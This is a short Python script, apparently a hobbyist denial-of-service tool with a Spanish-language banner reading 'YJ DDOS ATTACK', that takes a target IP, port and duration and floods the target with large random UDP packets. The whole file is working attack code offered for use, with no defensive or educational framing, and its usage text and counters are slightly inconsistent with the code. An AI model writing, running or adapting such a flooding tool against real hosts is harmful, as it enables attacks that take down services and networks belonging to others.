import time
import socket
import random
import sys
from colorama import Fore

Rojo = Fore.RED
reset = Fore.RESET

def usage():
    print(f"""{Rojo}
       █████           █████      ███  █████      ███  ██████████       █████                 
      ░░███           ░░███      ░░░  ░░███      ░░░  ░░███░░░░███     ░░███                  
       ░███   ██████   ░███████  ████  ░███████  ████  ░███   ░░███  ███████   ██████   █████ 
       ░███  ░░░░░███  ░███░░███░░███  ░███░░███░░███  ░███    ░███ ███░░███  ███░░███ ███░░  
       ░███   ███████  ░███ ░███ ░███  ░███ ░███ ░███  ░███    ░███░███ ░███ ░███ ░███░░█████ 
 ███   ░███  ███░░███  ░███ ░███ ░███  ░███ ░███ ░███  ░███    ███ ░███ ░███ ░███ ░███ ░░░░███
░░████████  ░░████████ ████████  █████ ████████  █████ ██████████  ░░████████░░██████  ██████ 
 ░░░░░░░░    ░░░░░░░░ ░░░░░░░░  ░░░░░ ░░░░░░░░  ░░░░░ ░░░░░░░░░░    ░░░░░░░░  ░░░░░░  ░░░░░░         
{Fore.GREEN}+++====|||||||YJ DDOS ATTACK|||||||====+++{reset} 
            ==|| USA "python2 Ddos.py" "<ip>  <port>  <packet> "||==                                                                                         

"""+reset)
    

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print(f"[{Rojo}>{reset}]Ataque: {sent} [{Rojo}>{reset}]IP: {victim} [{Rojo}>{reset}]Puerto {vport} ")
def main():
    len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
